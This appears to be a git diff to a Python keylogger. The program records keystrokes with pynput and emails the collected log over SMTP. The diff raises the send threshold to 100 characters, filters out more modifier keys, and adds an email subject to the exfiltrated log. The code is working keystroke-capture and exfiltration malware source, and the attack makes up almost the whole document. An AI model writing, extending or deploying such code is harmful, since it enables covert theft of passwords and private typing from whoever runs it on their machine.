@@ -4,7 +4,10 @@ import smtplib
 
 from pynput.keyboard import Key, Listener
 
-print("KELOGGER >:^)")
+print(
+    "KEYLOGGER"
+    "Press escape to exit the program."
+)
 
 # set up email
 email = input('Enter email: ')
@@ -19,7 +22,7 @@ server.login(email, password)
 full_log = ' '
 word = ' '
 # logger will send email every 50 characters
-char_limit = 50
+char_limit = 100
 # on press function
 
 
@@ -38,7 +41,7 @@ def on_press(key):
             send_log()
             full_log = ' '
 
-    elif key == Key.shift_l or key == Key.shift_r:  # ignores left or right shift
+    elif key == Key.shift_l or key == Key.shift_r or key == Key.alt_l or key == Key.alt_r or key == Key.tab or key == Key.ctrl_l or key == Key.ctrl_r:  # ignores left or right shift
         return
     elif key == Key.backspace:
         word = word[:-1]  # removes last item in array(slice notation)
@@ -54,10 +57,14 @@ def on_press(key):
 
 
 def send_log():
+    message = """\
+Subject: Logger
+
+Logger: """ + full_log
     server.sendmail(
         email,  # to
         email,  # from
-        full_log
+        message
     )
 
 
